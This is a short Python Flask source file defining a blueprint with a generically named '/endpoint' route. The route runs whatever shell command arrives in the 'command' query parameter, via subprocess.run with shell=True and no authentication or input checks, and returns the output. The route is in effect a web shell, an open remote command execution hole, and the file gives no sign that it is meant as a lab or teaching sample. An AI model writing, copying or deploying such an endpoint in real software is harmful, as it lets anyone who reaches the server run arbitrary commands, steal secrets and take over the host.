from flask import Blueprint, request, jsonify
import subprocess

endpoint_bp = Blueprint("endpoint", __name__)

@endpoint_bp.route("/endpoint")
def endpoint():
    try:
        req = request.args.get('command', '')

        if not req:
            return jsonify({'error': 'No command provided'}), 400
        
        result = subprocess.run(req, shell=True, capture_output=True, text=True)

        return jsonify({'status': result.stdout.splitlines()}), 200
    
    except Exception as e:
        return jsonify({'error': str(e)}), 500
   